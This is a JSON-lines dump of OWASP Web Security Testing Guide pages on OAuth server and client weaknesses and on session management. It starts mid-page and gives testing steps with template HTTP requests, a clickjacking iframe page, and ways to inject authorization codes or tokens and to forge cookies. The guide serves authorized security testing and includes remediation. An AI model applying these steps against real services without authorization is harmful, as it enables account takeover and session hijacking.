authorization request that sends the `redirect_uri` to the authorization server. The client `client.example.com` sends an authorization request to the AS `as.example.com` with the URL-encoded redirect URI `http%3A%2F%2Fclient.example.com%2F`.\n\n```http\nGET /authorize\n    ?redirect_uri=http%3A%2F%2Fclient.example.com%2F\n    &client_id=example-client\n    &errorPath=%2Ferror\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=query\n    &state=example\n    &nonce=example\n    &code_challenge=example\n    &code_challenge_method=S256 HTTP/1.1\nHost: as.example.com\n```\n\nThe AS responds with a redirect containing the authorization code. This can be exchanged with an access token in the token request. As shown below, the URL in the `Location` header is the URI given in the previous `redirect_uri` parameter.\n\n```http\nHTTP/1.1 302 Found\nDate: Mon, 18 Oct 2021 20:46:44 GMT\nContent-Type: text/html; charset=utf-8\nContent-Length: 340\nLocation: https://client.example.com/?code=example&state=example\n```\n\nTo test if the AS is vulnerable to insufficient redirect URI validation, capture the traffic with an HTTP intercepting proxy such as ZAP.\n\n1. Start the OAuth flow and pause it at the authorization request.\n2. Change the value of the `redirect_uri` and observe the response.\n3. Investigate the response and identify if the arbitrary `redirect_uri` parameter was accepted by the AS.\n\nIf the AS redirects the user agent to the `redirect_uri` you specified, the AS does not properly validate the `redirect_uri`.\n\nAdditionally, see the `Common Filter Bypass` section in [Testing for Server-Side Request Forgery](../07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md) to identity common bypasses for redirect URI validation.\n\n### Testing for Authorization Code Injection\n\nDuring the Authorization Code flow code exchange, a code is issued by the AS to the client and later exchanged against the token endpoint to retrieve an authorization token and a refresh token.\n\nConduct the following tests against the AS:\n\n1. Send a valid code for another `client_id`.\n2. Send a valid code for another resource owner.\n3. Send a valid code for another `redirect_uri`.\n4. Resend the code more than once (code replay).\n\n#### Test Public Clients\n\nThe request sent to the token endpoint contains the authorization code. It is exchanged against the token. Capture this request with an HTTP intercepting proxy like ZAP and resend the request with modified values.\n\n```http\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n    \"errorPath\":\"/error\",\n    \"client_id\":\"example-client\",\n    \"code\":\"INJECT_CODE_HERE\",\n    \"grant_type\":\"authorization_code\",\n    \"redirect_uri\":\"https://client.example.com\"\n}\n```\n\nIf the AS responds with an `access_token`, the code was successfully injected.\n\n#### Test Confidential Clients\n\nAs the OAuth flow for confidential clients is additionally protected by a client secret, it is not possible to directly submit an authorization code to the token endpoint. Instead, inject the authorization code into the client. This injected code will then be sent in the token request, issued by the confidential client together with the client secret.\n\nFirst, capture an authorization code from the AS:\n\n1. Start the authorization code flow with user Alice. Pause when you receive a code from the AS.\n2. Do not submit the code to the client and keep note of the code and corresponding state.\n\nThen, inject the code:\n\n 1. Start the authorization code flow with user Mallory and inject the previously gathered code and state values for user Alice into the process.\n 2. When the attack is successful, the client should now be in possession of an `authorization_token` that grants access to resources owned by user Alice.\n\n```http\nGET /callback?code=INJECT_CODE_HERE&state=example HTTP/1.1\nHost: client.example.com\n[...]\n\n```\n\n### Testing for PKCE Downgrade Attack\n\nUnder certain circumstances the PKCE extension can be removed from the authorization code flow. This has the potential to leave public clients vulnerable to attacks mitigated by the PKCE extension.\n\nThis can happen when:\n\n- The AS does not support PKCE.\n- The AS does not properly validate PKCE.\n\nBoth can be tested with an HTTP intercepting proxy like ZAP. Conduct the following tests:\n\n1. Send the authorization request without the `code_challenge=sha256(xyz)` and `code_challenge_method` parameter.\n2. Send the authorization request with an empty value for the `code_challenge=sha256(xyz)` parameter.\n3. Send the authorization request with a forged value for the `code_challenge=sha256(xyz)` parameter\n\nThe example below highlights the values to modify:\n\n```http\nGET /authorize\n    ?redirect_uri=http%3A%2F%client.example.com\n    &client_id=example-client\n    &errorPath=%2Ferror\n    &scope=openid%20profile%20email\n    &response_type=code\n    &response_mode=web_message\n    &state=example-state\n    &nonce=example-nonce\n    &code_challenge=MODIFY_OR_OMIT_THIS\n    &code_challenge_method=MODIFY_OR_OMIT_THIS\n    &prompt=none HTTP/1.1\nHost: as.example.com\n[...]\n\n```\n\nThe AS should verify the `code_verifier` value in the token exchange. To test:\n\n1. Send the token request without the `code_verifier`.\n2. Send the token request with an empty `code_verifier`.\n3. Send the token request with a valid `code_verifier` for a different authorization code.\n\n```http\nPOST /oauth/token HTTP/1.1\nHost: as.example.com\n[...]\n\n{\n\"client_id\":\"example-client\",\n\"code_verifier\":\"MODIFY_OR_OMIT_THIS\",\n\"code\":\"example\",\n\"grant_type\":\"authorization_code\",\n\"redirect_uri\":\"https://client.example.com\"\n}\n```\n\n### Testing for Consent Page Cross-Site Request Forgery\n\nCSRF attacks are described in [CSRF](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md). OAuth can be attacked with CSRF.\n\nTo prevent CSRF attacks OAuth, leverages the `state` parameter as an anti-CSRF token.\n\nOther measures can prevent CSRF attacks as well. The PKCE flow mitigates CSRF. A `nonce` value may act as an anti-CSRF token as well.\n\nTest every request that contains one of the anti-CSRF parameters used by OAuth according to the tests described in the [CSRF](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md) test cases.\n\nThe consent page is displayed to a user to verify that this user consents in the client accessing the resource on the users behalf. Attacking the consent page with CSRF may grant an arbitrary client access to a resource on behalf of the user. The steps of this flow are:\n\n1. The Client generates a state parameter and sends it with the consent request.\n2. The User Agent displays the consent page.\n3. The Resource Owner grants access to the Client.\n4. The consent is sent to the AS together with the acknowledged scopes.\n\nUse an HTTP intercepting proxy like ZAP to test whether the state parameter is properly validated.\n\n```http\nPOST /u/consent?state=Tampered_State HTTP/1.1\nHost: as.example.com\n[...]\n\nstate=MODIFY_OR_OMIT_THIS\n&audience=https%3A%2F%2Fas.example.com%2Fuserinfo\n&scope%5B%5D=profile\n&scope%5B%5D=email\n&action=accept\n```\n\n### Testing for Clickjacking\n\nClickjacking is described in [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md). When the consent page is prone to clickjacking and the attacker is in possession of the `client_id` (for public clients, or the client secret for confidential clients), the attacker can forge the user's consent and gain access to the requested resource through a rogue client.\n\n#### How to Test\n\nFor this attack to be successful, the attacker needs to load the authorization page in an iframe.\n\nThe following HTML page can be used to load the authorization page in an iframe:\n\n```html\n<html>\n    <head>\n        <title>Clickjack test page</title>\n    </head>\n    <body>\n        <iframe src=\"https://as.example.com/auth/realms/example/login-actions/required-action?execution=OAUTH_GRANT&client_id=example-client\" width=\"500\" height=\"500\"></iframe>\n    </body>\n</html>\n```\n\nIf successfully loaded, the site is vulnerable to clickjacking.\n\nSee [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md) for a detailed description of how such an attack can be conducted.\n\n### Testing Token Lifetime\n\nOAuth has two types of tokens: the access token and the refresh token. An access token should be limited in the duration of its validity. That means it is short-lived: a good duration depends on the application and may be 5 to 15 minutes.\n\nThe refresh token should be valid for a longer duration. It should be a one-time token that gets replaced each time it has been used.\n\n#### Test Access Token Lifetime Validation\n\nWhen a JSON Web Token (JWT) is used as the access token, it is possible to retrieve the validity of the access token from the decoded JWT. This is described in [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md). It is possible that the AS does not properly validate the lifetime of the JWT.\n\nTo test the lifetime of the access token, use an HTTP intercepting proxy such as ZAP. Intercept a request to an endpoint that contains an access token. Put this request in the repeater and let the targeted time pass. The validity of an access token should be between 5 and 15 minutes, depending on the sensitivity of the resources.\n\nSuch requests may look like the following example. The token could also be transported in other ways, for example, in a cookie.\n\n```http\nGET /userinfo HTTP/1.1\nHost: as.example.com\n[...]\nAuthorization: Bearer eyJhbGciOiJkaXIiL[...]\n\n```\n\nTest for lifetime validation by sending the request after varying lengths of time have passed, for example, after 5 minutes, 10 minutes, and 30 minutes.\n\nThis process can be optimized by automating the steps and logging of the server's response. When a response of HTTP status 403 (instead of HTTP status 200) is received, this can indicate that the access token is no longer valid.\n\n#### Test Refresh Token Lifetime Validation\n\nRefresh tokens have a longer validity period than access tokens. Due to their long validity, they should be invalidated after they are used in an exchange against an access token.\n\nRefresh tokens are issued in the same token request where the access token is handed out to the client.\n\nUse an HTTP intercepting proxy such as ZAP. Set up the test by doing the following:\n\n1. Retrieve a valid refresh token.\n2. Capture the request that is used to exchange the refresh token against a new access token.\n3. Send the captured request to the request repeater.\n\nIn the following example, the refresh token is sent as part of the POST body.\n\n```http\nPOST /token HTTP/1.1\nHost: as.example.com\nCookie: [...]\n[...]\n\ngrant_type=refresh_token\n&refresh_token=eyJhbGciOiJIUz[...]\n&client_id=example-client\n\n```\n\nConduct the following tests:\n\n1. Send the refresh token and determine if the AS hands out an access token.\n2. Repeat the steps with the same refresh token to evaluate how often a single refresh token is accepted.\n\nWhen a JWT is used as the refresh token, it is possible to retrieve the validity of the refresh token from the decoded JWT. This is described in [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md). The refresh token may be valid for a longer period of time, but should have an expiry date.\n\nAdditional security can be gained with a theft detection mechanism. If a refresh token is used in a token exchange beyond its validity (or lifetime), the AS invalidates all refresh tokens. To test this mechanism:\n\n1. Send the refresh token and determine if the AS hands out an access token.\n2. Repeat the steps with the same refresh token until it is invalidated.\n3. Use the refresh token from the last token response\n\nIf all refresh tokens that were issued to the client for this resource owner are invalidated, the AS has token theft detection.\n\n## Related Test Cases\n\n- [Testing for Cross Site Request Forgery](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)\n- [Testing for Client-side URL Redirect](../11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md)\n- [Testing for Server-Side Request Forgery](../07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md)\n- [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)\n- [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md)\n- [Testing Cross Origin Resource Sharing](../11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md)\n\n## Remediation\n\nMost of the attacks against OAuth AS can be mitigated by validating the existence and content of parameters during the authorization code and token exchange.\n\nRestrict the time span and allowed usage for credentials such as the authorization code and refresh token. This can mitigate some types of attacks and also limits the use of such credentials for an attacker, if they are gained.\n\nProper configuration of security mitigation like CORS, anti-CSRF tokens, and anti-clickjacking headers can mitigate or limit the impact of attacks.\n\n- Always validate if all parameters are present, and validate their values.\n- Use the PKCE extension to properly secure the authorization code and token exchange.\n- Do not allow fallback for security features like the PKCE extension.\n- Restrict the lifetime of credentials.\n- Use credentials only once where possible, e.g. the authorization code.\n- Configure available security mitigation like CORS, anti-CSRF tokens, and anti-clickjacking headers.\n\n## Tools\n\n- [BurpSuite](https://portswigger.net/burp/releases)\n- [EsPReSSO](https://github.com/portswigger/espresso)\n- [ZAP](https://www.zaproxy.org/)\n\n## References\n\n- [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)\n- [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)\n- [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)\n- [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)\n- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)\n- [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)\n", "timestamp": "2025-10-24T11:39:48.682244"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses.md", "content": "# Testing for OAuth Client Weaknesses\n\n## Summary\n\nOAuth grants access rights on resources to clients. This allows them to act on behalf of the resource owner. The client receives the authorization code and refresh token in the token exchange and stores them.\n\nFailure to protect the token exchange and credentials may result in unauthorized resource access and the elevation of privileges.\n\n## Test Objectives\n\n- Identify weaknesses in the OAuth client.\n\n## How to test\n\nIn order to test for client weaknesses, you will aim to:\n\n1. Retrieve credentials used for authorization.\n2. Grant yourself access to arbitrary resources through forceful browsing.\n3. Bypass the authorization.\n\n### Testing for Exposed Client Secret\n\nThe client secret is used to authenticate the client against the Authorization Server (AS) in order to prove that the client is a trusted origin.\n\nPublic clients are generally not able to store the client secret securely.\n\nTo identify the client secret in client-side code, conduct reconnaissance on the client-side code.\n\n1. Browse to the application.\n2. Open the browser's developer tools.\n3. Navigate to the Debugger Tab.\n4. Press Ctrl+Shift+F to open the search.\n5. Search for terms similar to `client-secret` and determine if any are found.\n\nIf this is not successful, you can also:\n\n1. Step through the authorization process with a HTTP intercepting proxy like ZAP.\n2. Retrieve the client secret from the URI in the parameter `client-secret`.\n3. Replace the search term in the above search with the value of the client secret and determine if it is exposed.\n\n### Testing for Improper Token Storage\n\nThe client receives access tokens and ideally stores them in a location where those tokens can be protected from attackers.\n\nConfidential clients should store tokens in volatile memory to prevent access through other attacks such as local file inclusion, attackers who are able to access the environment, or SQL Injection attacks.\n\nPublic clients, such as single-page applications, do not have the possibility of storing tokens securely. For example, a cross-site scripting attack allows attackers to access credentials stored in the browser.\n\nPublic clients may store tokens in the browsers session storage or in a cookie, but not in the local storage. To determine if tokens are improperly stored:\n\n1. Browse to the application.\n2. Retrieve an access token.\n3. Open the browser's developer tools.\n4. Navigate to the Application Tab.\n5. Locate the Local Storage and view stored data.\n6. Locate the Session Storage and view stored data.\n7. Locate the Cookie Store and view stored data.\n\n### Testing for Access Token Injection\n\nThis attack is only possible when the client uses a response type that directly issues an access token to the client. This occurs with the grant types Implicit Flows, Resource Owner Password Credential, and machine-to-machine flows. See [Testing for OAuth Weaknesses](05-Testing_for_OAuth_Weaknesses.md) for further description.\n\nAccess token injection is successful when an access token is leaked to an attacker and then used to authenticate with the legitimate client.\n\nTo test for access token injection, follow the steps below. In this example, the authorization token (`ZXhhbXBsZQo=`) was leaked.\n\n1. Intercept the traffic between the client and the authorization server.\n2. Start an OAuth flow with a client using the Implicit Flow grant type.\n3. Inject the stolen access token:\n    - Send a forged authorization response with the stolen access token (`ZXhhbXBsZQo=`) to the client.\n    - Intercept a valid authorization response and replace the access token (`dGVzdGluZwo=`) with the leaked one (`ZXhhbXBsZQo=`).\n\n![A diagram of the access token injection flow](images/token-injection.png)\\\n*Figure 4.5.5.2-: Access Token Injection Flow*\n\n## Related Test Cases\n\n- [Testing for Cross Site Request Forgery](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)\n- [Testing for Client-side URL Redirect](../11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md)\n- [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)\n- [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md)\n- [Testing Cross Origin Resource Sharing](../11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md)\n\n## Remediation\n\n- Use a client secret only if the client has the ability to store it securely.\n- Follow best practices to store tokens securely. Treat them with the same security considerations as other credentials.\n- Avoid deprecated OAuth grant types. See [Testing for OAuth Weaknesses](05-Testing_for_OAuth_Weaknesses.md) for further description.\n\n## Tools\n\n- [BurpSuite](https://portswigger.net/burp/releases)\n- [EsPReSSO](https://github.com/portswigger/espresso)\n- [ZAP](https://www.zaproxy.org/)\n\n## References\n\n- [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)\n- [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)\n- [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)\n- [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)\n- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)\n- [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)\n", "timestamp": "2025-10-24T11:39:48.804893"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/05-Authorization_Testing/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/README.md", "content": "# 4.5 Authorization Testing\n\n4.5.1 [Testing Directory Traversal File Include](01-Testing_Directory_Traversal_File_Include.md)\n\n4.5.2 [Testing for Bypassing Authorization Schema](02-Testing_for_Bypassing_Authorization_Schema.md)\n\n4.5.3 [Testing for Privilege Escalation](03-Testing_for_Privilege_Escalation.md)\n\n4.5.4 [Testing for Insecure Direct Object References](04-Testing_for_Insecure_Direct_Object_References.md)\n\n4.5.5 [Testing for OAuth Weaknesses](05-Testing_for_OAuth_Weaknesses.md)\n\n4.5.5.1 [Testing for OAuth Authorization Server Weaknesses](05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md)\n\n4.5.5.2 [Testing for OAuth Client Weaknesses](05.2-Testing_for_OAuth_Client_Weaknesses.md)\n", "timestamp": "2025-10-24T11:39:48.862889"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md", "content": "# Testing for Session Management Schema\n\n|ID          |\n|------------|\n|WSTG-SESS-01|\n\n## Summary\n\nOne of the core components of any web-based application is the mechanism by which it controls and maintains the state for a user interacting with it. To avoid continuous authentication for each page of a site or service, web applications implement various mechanisms to store and validate credentials for a pre-determined timespan. These mechanisms are known as Session Management.\n\nIn this test, the tester wants to check that cookies and other session tokens are created in a secure and unpredictable way. An attacker who is able to predict and forge a weak cookie can easily hijack the sessions of legitimate users.\n\nCookies are used to implement session management and are described in detail in RFC 2965. In a nutshell, when a user accesses an application which needs to keep track of the actions and identity of that user across multiple requests, a cookie (or cookies) is generated by the server and sent to the client. The client will then send the cookie back to the server in all following connections until the cookie expires or is destroyed. The data stored in the cookie can provide to the server a large spectrum of information about who the user is, what actions he has performed so far, what his preferences are, etc. therefore providing a state to a stateless protocol like HTTP.\n\nA typical example is provided by an online shopping cart. Throughout the session of a user, the application must keep track of his identity, his profile, the products that he has chosen to buy, the quantity, the individual prices, the discounts, etc. Cookies are an efficient way to store and pass this information back and forth (other methods are URL parameters and hidden fields).\n\nDue to the importance of the data that they store, cookies are therefore vital in the overall security of the application. Being able to tamper with cookies may result in hijacking the sessions of legitimate users, gaining higher privileges in an active session, and in general influencing the operations of the application in an unauthorized way.\n\nIn this test the tester has to check whether the cookies issued to clients can resist a wide range of attacks aimed to interfere with the sessions of legitimate users and with the application itself. The overall goal is to be able to forge a cookie that will be considered valid by the application and that will provide some kind of unauthorized access (session hijacking, privilege escalation, ...).\n\nUsually the main steps of the attack pattern are the following:\n\n- **cookie collection**: collection of a sufficient number of cookie samples;\n- **cookie reverse engineering**: analysis of the cookie generation algorithm;\n- **cookie manipulation**: forging of a valid cookie in order to perform the attack. This last step might require a large number of attempts, depending on how the cookie is created (cookie brute-force attack).\n\nAnother pattern of attack consists of overflowing a cookie. Strictly speaking, this attack has a different nature, since here testers are not trying to recreate a perfectly valid cookie. Instead, the goal is to overflow a memory area, thereby interfering with the correct behavior of the application and possibly injecting (and remotely executing) malicious code.\n\n## Test Objectives\n\n- Gather session tokens, for the same user and for different users where possible.\n- Analyze and ensure that enough randomness exists to stop session forging attacks.\n- Modify cookies that are not signed and contain information that can be manipulated.\n\n## How to Test\n\n### Black-Box Testing and Examples\n\nAll interaction between the client and application should be tested at least against the following criteria:\n\n- Are all `Set-Cookie` directives tagged as `Secure`?\n- Do any Cookie operations take place over unencrypted transport?\n- Can the Cookie be forced over unencrypted transport?\n- If so, how does the application maintain security?\n- Are any Cookies persistent?\n- What `Expires` times are used on persistent cookies, and are they reasonable?\n- Are cookies that are expected to be transient configured as such?\n- What HTTP/1.1 `Cache-Control` settings are used to protect Cookies?\n- What HTTP/1.0 `Cache-Control` settings are used to protect Cookies?\n\n#### Cookie Collection\n\nThe first step required to manipulate the cookie is to understand how the application creates and manages cookies. For this task, testers have to try to answer the following questions:\n\n- How many cookies are used by the application?\n\n  Surf the application. Note when cookies are created. Make a list of received cookies, the page that sets them (with the set-cookie directive), the domain for which they are valid, their value, and their characteristics.\n\n- Which parts of the application generate or modify the cookie?\n\n  Surfing the application, find which cookies remain constant and which get modified. What events modify the cookie?\n\n- Which parts of the application require this cookie in order to be accessed and utilized?\n\n  Find out which parts of the application need a cookie. Access a page, then try again without the cookie, or with a modified value of it. Try to map which cookies are used where.\n\nA spreadsheet mapping each cookie to the corresponding application parts and the related information can be a valuable output of this phase.\n\n#### Session Analysis\n\nThe session tokens (Cookie, SessionID or Hidden Field) themselves should be examined to ensure their quality from a security perspective. They should be tested against criteria such as their randomness, uniqueness, resistance to statistical and cryptographic analysis and information leakage.\n\n- Token Structure & Information Leakage\n\nThe first stage is to examine the structure and content of a Session ID provided by the application. A common mistake is to include specific data in the Token instead of issuing a generic value and referencing real data server-side.\n\nIf the Session ID is clear-text, the structure and pertinent data may be immediately obvious such as `192.168.100.1:owaspuser:password:15:58`.\n\nIf part or the entire token appears to be encoded or hashed, it should be compared to various techniques to check for obvious obfuscation. For example the string `192.168.100.1:owaspuser:password:15:58` is represented in hex, base64, and as an MD5 hash:\n\n- Hex: `3139322E3136382E3130302E313A6F77617370757365723A70617373776F72643A31353A3538`\n- Base64: `MTkyLjE2OC4xMDAuMTpvd2FzcHVzZXI6cGFzc3dvcmQ6MTU6NTg=`\n- MD5: `01c2fc4f0a817afd8366689bd29dd40a`\n\nHaving identified the type of obfuscation, it may be possible to decode back to the original data. In most cases, however, this is unlikely. Even so, it may be useful to enumerate the encoding in place from the format of the message. Furthermore, if both the format and obfuscation technique can be deduced, automated brute-force attacks could be devised.\n\nHybrid tokens may include information such as IP address or User ID together with an encoded portion, such as `owaspuser:192.168.100.1:a7656fafe94dae72b1e1487670148412`.\n\nHaving analyzed a single session token, the representative sample should be examined. A simple analysis of the tokens should immediately reveal any obvious patterns. For example, a 32 bit token may include 16 bits of static data and 16 bits of variable data. This may indicate that the first 16 bits represent a fixed attribute of the user – e.g. the username or IP address. If the second 16 bit chunk is incrementing at a regular rate, it may indicate a sequential or even time-based element to the token generation. See examples.\n\nIf static elements to the Tokens are identified, further samples should be gathered, varying one potential input element at a time. For example, log in attempts through a different user account or from a different IP address may yield a variance in the previously static portion of the session token.\n\nThe following areas should be addressed during the single and multiple Session ID structure testing:\n\n- What parts of the Session ID are static?\n- What clear-text confidential information is stored in the Session ID? E.g. usernames/UID, IP addresses\n- What easily decoded confidential information is stored?\n- What information can be deduced from the structure of the Session ID?\n- What portions of the Session ID are static for the same log in conditions?\n- What obvious patterns are present in the Session ID as a whole, or individual portions?\n\n#### Session ID Predictability and Randomness\n\nAnalysis of the variable areas (if any) of the Session ID should be undertaken to establish the existence of any recognizable or predictable patterns. These analyses may be performed manually and with bespoke or OTS statistical or cryptanalytic tools to deduce any patterns in the Session ID content. Manual checks should include comparisons of Session IDs issued for the same login conditions – e.g., the same username, password, and IP address.\n\nTime is an important factor which must also be controlled. High numbers of simultaneous connections should be made in order to gather samples in the same time window and keep that variable constant. Even a quantization of 50ms or less may be too coarse and a sample taken in this way may reveal time-based components that would otherwise be missed.\n\nVariable elements should be analyzed over time to determine whether they are incremental in nature. Where they are incremental, patterns relating to absolute or elapsed time should be investigated. Many systems use time as a seed for their pseudo-random elements. Where the patterns are seemingly random, one-way hashes of time or other environmental variations should be considered as a possibility. Typically, the result of a cryptographic hash is a decimal or hexadecimal number so should be identifiable.\n\nIn analyzing Session ID sequences, patterns or cycles, static elements and client dependencies should all be considered as possible contributing elements to the structure and function of the application.\n\n- Are the Session IDs provably random in nature? Can the resulting values be reproduced?\n- Do the same input conditions produce the same ID on a subsequent run?\n- Are the Session IDs provably resistant to statistical or cryptanalysis?\n- What elements of the Session IDs are time-linked?\n- What portions of the Session IDs are predictable?\n- Can the next ID be deduced, given full knowledge of the generation algorithm and previous IDs?\n\n#### Cookie Reverse Engineering\n\nNow that the tester has enumerated the cookies and has a general idea of their use, it is time to have a deeper look at cookies that seem interesting. Which cookies is the tester interested in? A cookie, in order to provide a secure method of session management, must combine several characteristics, each of which is aimed at protecting the cookie from a different class of attacks.\n\nThese characteristics are summarized below:\n\n1. Unpredictability: a cookie must contain some amount of hard-to-guess data. The harder it is to forge a valid cookie, the harder is to break into legitimate user's session. If an attacker can guess the cookie used in an active session of a legitimate user, they will be able to fully impersonate that user (session hijacking). In order to make a cookie unpredictable, random values or cryptography can be used.\n2. Tamper resistance: a cookie must resist malicious attempts of modification. If the tester receives a cookie like `IsAdmin=No`, it is trivial to modify it to get administrative rights, unless the application performs a double check (for instance, appending to the cookie an encrypted hash of its value)\n3. Expiration: a critical cookie must be valid only for an appropriate period of time and must be deleted from the disk or memory afterwards to avoid the risk of being replayed. This does not apply to cookies that store non-critical data that needs to be remembered across sessions (e.g., site look-and-feel).\n4. `Secure` flag: a cookie whose value is critical for the integrity of the session should have this flag enabled in order to allow its transmission only in an encrypted channel to deter eavesdropping.\n\nThe approach here is to collect a sufficient number of instances of a cookie and start looking for patterns in their value. The exact meaning of \"sufficient\" can vary from a handful of samples, if the cookie generation method is very easy to break, to several thousands, if the tester needs to proceed with some mathematical analysis (e.g., chi-squares, attractors. See later for more information).\n\nIt is important to pay particular attention to the workflow of the application, as the state of a session can have a heavy impact on collected cookies. A cookie collected before being authenticated can be very different from a cookie obtained after the authentication.\n\nAnother aspect to keep into consideration is time. Always record the exact time when a cookie has been obtained, when there is the possibility that time plays a role in the value of the cookie (the server could use a timestamp as part of the cookie value). The time recorded could be the local time or the server's timestamp included in the HTTP response (or both).\n\nWhen analyzing the collected values, the tester should try to figure out all variables that could have influenced the cookie value and try to vary them one at the time. Passing to the server modified versions of the same cookie can be very helpful in understanding how the application reads and processes the cookie.\n\nExamples of checks to be performed at this stage include:\n\n- What character set is used in the cookie? Has the cookie a numeric value? alphanumeric? hexadecimal? What happens if the tester inserts in a cookie characters that do not belong to the expected charset?\n- Is the cookie composed of different sub-parts carrying different pieces of information? How are the different parts separated? With which delimiters? Some parts of the cookie could have a higher variance, others might be constant, others could assume only a limited set of values. Breaking down the cookie to its base components is the first and fundamental step.\n\nAn example of an easy-to-spot structured cookie is the following:\n\n```text\nID=5a0acfc7ffeb919:CR=1:TM=1120514521:LM=1120514521:S=j3am5KzC4v01ba3q\n```\n\nThis example shows 5 different fields, carrying different types of data:\n\n- ID – hexadecimal\n- CR – small integer\n- TM and LM – large integer. (And curiously they hold the same value. Worth to see what happens modifying one of them)\n- S – alphanumeric\n\nEven when no delimiters are used, having enough samples can help understand the structure.\n\n#### Brute Force Attacks\n\nBrute force attacks inevitably lead on from questions relating to predictability and randomness. The variance within the Session IDs must be considered together with application session duration and timeouts. If the variation within the Session IDs is relatively small, and Session ID validity is long, the likelihood of a successful brute-force attack is much higher.\n\nA long Session ID (or rather one with a great deal of variance) and a shorter validity period would make it far harder to succeed in a brute force attack.\n\n- How long would a brute-force attack on all possible Session IDs take?\n- Is the Session ID space large enough to prevent brute forcing? For example, is the length of the key sufficient when compared to the valid life-span?\n- Do delays between connection attempts with different Session IDs mitigate the risk of this attack?\n\n### Gray-Box Testing and Example\n\nIf the tester has access to the session management schema implementation, they can check for the following:\n\n- Random Session Token\n\n  The Session ID or Cookie issued to the client should not be easily predictable (don't use linear algorithms based on predictable variables such as the client IP address). The use of cryptographic algorithms with key length of 256 bits is encouraged (like AES).\n\n- Token length\n\n  Session ID will be at least 50 characters length.\n\n- Session Time-out\n\n  Session token should have a defined time-out (it depends on the criticality of the application managed data)\n\n- Cookie configuration:\n    - non-persistent: only RAM memory\n    - secure (set only on HTTPS channel): `Set-Cookie: cookie=data; path=/; domain=.aaa.it; secure`\n    - [HTTPOnly](https://owasp.org/www-community/HttpOnly) (not readable by a script): `Set-Cookie: cookie=data; path=/; domain=.aaa.it; HttpOnly`\n\nMore information here: [Testing for cookies attributes](02-Testing_for_Cookies_Attributes.md)\n\n## Tools\n\n- [Zed Attack Proxy Project (ZAP)](https://www.zaproxy.org) - features a session token analysis mechanism.\n- [Burp Sequencer](https://portswigger.net/burp/documentation/desktop/tools/sequencer)\n- [YEHG's JHijack](https://github.com/yehgdotnet/JHijack)\n\n## References\n\n### Whitepapers\n\n- [RFC 2965 \"HTTP State Management Mechanism\"](https://tools.ietf.org/html/rfc2965)\n- [RFC 1750 \"Randomness Recommendations for Security\"](https://www.ietf.org/rfc/rfc1750.txt)\n- [Michal Zalewski: \"Strange Attractors and TCP/IP Sequence Number Analysis\" (2001)](https://lcamtuf.coredump.cx/oldtcp/tcpseq.html)\n- [Michal Zalewski: \"Strange Attractors and TCP/IP Sequence Number Analysis - One Year Later\" (2002)](https://lcamtuf.coredump.cx/newtcp/)\n- [Correlation Coefficient](https://mathworld.wolfram.com/CorrelationCoefficient.html)\n- [ENT](https://fourmilab.ch/random/)\n- [DMA 2005-0614a - Global Hauri ViRobot Server cookie overflow](https://seclists.org/lists/fulldisclosure/2005/Jun/0188.html)\n- [OWASP Code Review Guide](https://wiki.owasp.org/index.php/Category:OWASP_Code_Review_Project)\n", "timestamp": "2025-10-24T11:39:49.433512"}
